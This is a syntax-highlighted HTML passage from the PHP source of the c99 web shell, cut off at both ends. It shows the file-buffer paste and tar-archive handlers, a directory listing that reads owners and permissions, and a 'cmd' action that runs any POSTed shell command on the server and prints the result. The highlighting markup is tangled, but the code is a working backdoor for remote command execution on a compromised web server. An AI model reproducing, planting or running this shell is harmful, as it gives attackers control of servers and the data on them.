   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs_move_obj</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$to</span><span class="p">))</span> <span class="p">{</span><span class="nv">$psterr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t move &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; to &quot;</span><span class="o">.</span><span class="nv">$to</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="nx">c99_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$psterr</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Pasting with errors:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$psterr</span><span class="p">;}</span>
  <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="k">elseif</span> <span class="p">(</span><span class="nv">$actarcbuff</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="nv">$arcerr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$actarcbuff_path</span><span class="p">,</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ext</span> <span class="o">=</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">;}</span>
  <span class="k">else</span> <span class="p">{</span><span class="nv">$ext</span> <span class="o">=</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$ext</span> <span class="o">==</span> <span class="s2">&quot;.tar.gz&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$cmdline</span> <span class="o">=</span> <span class="s2">&quot;tar cfzv&quot;</span><span class="p">;}</span>
  <span class="nv">$cmdline</span> <span class="o">.=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$actarcbuff_path</span><span class="p">;</span>
  <span class="nv">$objects</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">],</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$objects</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="nv">$v</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">,DIRECTORY_SEPARATOR,</span><span class="si">$v</span><span class="s2">);</span>
<span class="s2">   if (substr(</span><span class="si">$v</span><span class="s2">,0,strlen(</span><span class="si">$d</span><span class="s2">)) == </span><span class="si">$d</span><span class="s2">) </span><span class="si">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   if (is_dir(</span><span class="si">$v</span><span class="s2">))</span>
<span class="s2">   {</span>
<span class="s2">    if (substr(</span><span class="si">$v</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$v</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">    </span><span class="si">$v</span><span class="s2"> .= &quot;</span><span class="o">*</span><span class="s2">&quot;;</span>
<span class="s2">   }</span>
<span class="s2">   </span><span class="si">$cmdline</span><span class="s2"> .= &quot;</span> <span class="s2">&quot;.</span><span class="si">$v</span><span class="s2">;</span>
<span class="s2">  }</span>
<span class="s2">  </span><span class="si">$tmp</span><span class="s2"> = realpath(&quot;</span><span class="o">.</span><span class="s2">&quot;);</span>
<span class="s2">  chdir(</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2">  </span><span class="si">$ret</span><span class="s2"> = myshellexec(</span><span class="si">$cmdline</span><span class="s2">);</span>
<span class="s2">  chdir(</span><span class="si">$tmp</span><span class="s2">);</span>
<span class="s2">  if (empty(</span><span class="si">$ret</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$arcerr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t call archivator (&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nx">str2mini</span><span class="p">(</span><span class="nv">$cmdline</span><span class="p">,</span><span class="mi">60</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;)!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  </span><span class="si">$ret</span><span class="s2"> = str_replace(&quot;</span>
<span class="s2">&quot;,&quot;</span>
<span class="s2">&quot;,</span><span class="si">$ret</span><span class="s2">);</span>
<span class="s2">  </span><span class="si">$ret</span><span class="s2"> = explode(&quot;</span>
<span class="s2">&quot;,</span><span class="si">$ret</span><span class="s2">);</span>
<span class="s2">  if (</span><span class="si">$copy_unset</span><span class="s2">) {foreach(</span><span class="si">$sess_data[&quot;copy&quot;]</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&amp;gt;</span><span class="si">$v</span><span class="s2">) {unset(</span><span class="si">$sess_data[&quot;copy&quot;]</span><span class="s2">[</span><span class="si">$k</span><span class="s2">]);}}</span>
<span class="s2">  foreach(</span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&amp;gt;</span><span class="si">$v</span><span class="s2">)</span>
<span class="s2">  {</span>
<span class="s2">   if (in_array(</span><span class="si">$v</span><span class="s2">,</span><span class="si">$ret</span><span class="s2">)) {fs_rmobj(</span><span class="si">$v</span><span class="s2">);}</span>
<span class="s2">   unset(</span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2">[</span><span class="si">$k</span><span class="s2">]);</span>
<span class="s2">  }</span>
<span class="s2">  c99_sess_put(</span><span class="si">$sess_data</span><span class="s2">);</span>
<span class="s2">  if (!empty(</span><span class="si">$arcerr</span><span class="s2">)) {echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Archivation</span> <span class="nx">errors</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.</span><span class="si">$arcerr</span><span class="s2">;}</span>
<span class="s2">  </span><span class="si">$act</span><span class="s2"> = &quot;</span><span class="nx">ls</span><span class="s2">&quot;;</span>
<span class="s2"> }</span>
<span class="s2"> elseif (</span><span class="si">$actpastebuff</span><span class="s2">)</span>
<span class="s2"> {</span>
<span class="s2">  </span><span class="si">$psterr</span><span class="s2"> = &quot;&quot;;</span>
<span class="s2">  foreach(</span><span class="si">$sess_data[&quot;copy&quot;]</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&amp;gt;</span><span class="si">$v</span><span class="s2">)</span>
<span class="s2">  {</span>
<span class="s2">   </span><span class="si">$to</span><span class="s2"> = </span><span class="si">$d</span><span class="s2">.basename(</span><span class="si">$v</span><span class="s2">);</span>
<span class="s2">   if (!fs_copy_obj(</span><span class="si">$v</span><span class="s2">,</span><span class="si">$d</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$psterr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t copy &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; to &quot;</span><span class="o">.</span><span class="nv">$to</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   if (</span><span class="si">$copy_unset</span><span class="s2">) {unset(</span><span class="si">$sess_data[&quot;copy&quot;]</span><span class="s2">[</span><span class="si">$k</span><span class="s2">]);}</span>
<span class="s2">  }</span>
<span class="s2">  foreach(</span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&amp;gt;</span><span class="si">$v</span><span class="s2">)</span>
<span class="s2">  {</span>
<span class="s2">   </span><span class="si">$to</span><span class="s2"> = </span><span class="si">$d</span><span class="s2">.basename(</span><span class="si">$v</span><span class="s2">);</span>
<span class="s2">   if (!fs_move_obj(</span><span class="si">$v</span><span class="s2">,</span><span class="si">$d</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$psterr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t move &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; to &quot;</span><span class="o">.</span><span class="nv">$to</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   unset(</span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2">[</span><span class="si">$k</span><span class="s2">]);</span>
<span class="s2">  }</span>
<span class="s2">  c99_sess_put(</span><span class="si">$sess_data</span><span class="s2">);</span>
<span class="s2">  if (!empty(</span><span class="si">$psterr</span><span class="s2">)) {echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Pasting</span> <span class="nx">with</span> <span class="nx">errors</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.</span><span class="si">$psterr</span><span class="s2">;}</span>
<span class="s2">  </span><span class="si">$act</span><span class="s2"> = &quot;</span><span class="nx">ls</span><span class="s2">&quot;;</span>
<span class="s2"> }</span>
<span class="s2">}</span>
<span class="s2">if (</span><span class="si">$act</span><span class="s2"> == &quot;</span><span class="nx">cmd</span><span class="s2">&quot;)</span>
<span class="s2">{</span>
<span class="s2">if (trim(</span><span class="si">$cmd</span><span class="s2">) == &quot;</span><span class="nx">ps</span> <span class="o">-</span><span class="nx">aux</span><span class="s2">&quot;) </span><span class="si">{</span><span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;processes&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">elseif (trim(</span><span class="si">$cmd</span><span class="s2">) == &quot;</span><span class="nx">tasklist</span><span class="s2">&quot;) </span><span class="si">{</span><span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;processes&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">else</span>
<span class="s2">{</span>
<span class="s2"> @chdir(</span><span class="si">$chdir</span><span class="s2">);</span>
<span class="s2"> if (!empty(</span><span class="si">$submit</span><span class="s2">))</span>
<span class="s2"> {</span>
<span class="s2">  echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Result</span> <span class="nx">of</span> <span class="nx">execution</span> <span class="k">this</span> <span class="nx">command</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">  </span><span class="si">$olddir</span><span class="s2"> = realpath(&quot;</span><span class="o">.</span><span class="s2">&quot;);</span>
<span class="s2">  @chdir(</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2">  </span><span class="si">$ret</span><span class="s2"> = myshellexec(</span><span class="si">$cmd</span><span class="s2">);</span>
<span class="s2">  </span><span class="si">$ret</span><span class="s2"> = convert_cyr_string(</span><span class="si">$ret</span><span class="s2">,&quot;</span><span class="nx">d</span><span class="s2">&quot;,&quot;</span><span class="nx">w</span><span class="s2">&quot;);</span>
<span class="s2">  if (</span><span class="si">$cmd_txt</span><span class="s2">)</span>
<span class="s2">  {</span>
<span class="s2">   </span><span class="si">$rows</span><span class="s2"> = count(explode(&quot;</span>
<span class="s2">&quot;,</span><span class="si">$ret</span><span class="s2">))+1;</span>
<span class="s2">   if (</span><span class="si">$rows</span><span class="s2"> &amp;lt; 10) </span><span class="si">{</span><span class="nv">$rows</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">textarea</span> <span class="nx">cols</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;122</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$ret</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$ret</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$olddir</span><span class="p">);</span>
 <span class="p">}</span>
 <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Execution command&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$cmd_txt</span><span class="p">))</span> <span class="p">{</span><span class="nv">$cmd_txt</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}}</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=POST&amp;gt;&amp;lt;input type=hidden name=act value=cmd&amp;gt;&amp;lt;textarea name=cmd cols=122 rows=10&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">d</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$dispd</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Execute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;Display in text-area&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">cmd_txt</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$cmd_txt</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; checked&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;ls&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$ls_arr</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="nv">$list</span> <span class="o">=</span> <span class="nv">$ls_arr</span><span class="p">;}</span>
 <span class="k">else</span>
 <span class="p">{</span>
  <span class="nv">$list</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$h</span> <span class="o">=</span> <span class="o">@</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span>
  <span class="p">{</span>
   <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span><span class="nv">$list</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">;}</span>
   <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{}</span>
 <span class="p">}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$list</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Can&#39;t open folder (&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)!&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">else</span>
 <span class="p">{</span>
  <span class="c1">//Building array</span>
  <span class="nv">$objects</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="nv">$vd</span> <span class="o">=</span> <span class="s2">&quot;f&quot;</span><span class="p">;</span> <span class="c1">//Viewing mode</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$vd</span> <span class="o">==</span> <span class="s2">&quot;f&quot;</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
   <span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
   <span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
   <span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$list</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="nv">$o</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
    <span class="nv">$row</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">;</span> <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;LINK&quot;</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">;</span> <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;LINK&quot;</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;LINK&quot;</span><span class="p">;}</span>
     <span class="k">else</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;DIR&quot;</span><span class="p">;}</span>
     <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
     <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">elseif</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span> <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span>
    <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">filemtime</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$ow</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span>
     <span class="nv">$gr</span> <span class="o">=</span> <span class="nb">posix_getgrgid</span><span class="p">(</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span>
     <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">fileperms</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="nv">$row</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
   <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Name&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
   <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Size&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
   <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Modify&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span>
  <span class="p">{</span><span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Owner/Group&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Perms&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
   <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Action&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
   <span class="nv">$parsesort</span> <span class="o">=</span> <span class="nx">parsesort</span><span class="p">(</span><span class="nv">$sort</span><span class="p">);</span>
   <span class="nv">$sort</span> <span class="o">=</span> <span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
   <span class="nv">$k</span> <span class="o">=</span> <span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;}</span>
   <span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.sort.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;a&quot;</span><span class="o">?</span><span class="s2">&quot;d&quot;</span><span class="o">:</span><span class="s2">&quot;a&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
   <span class="nv">$row</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">.=</span> <span class="nv">$y</span><span class="p">;</span>
   <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
   <span class="p">{</span>
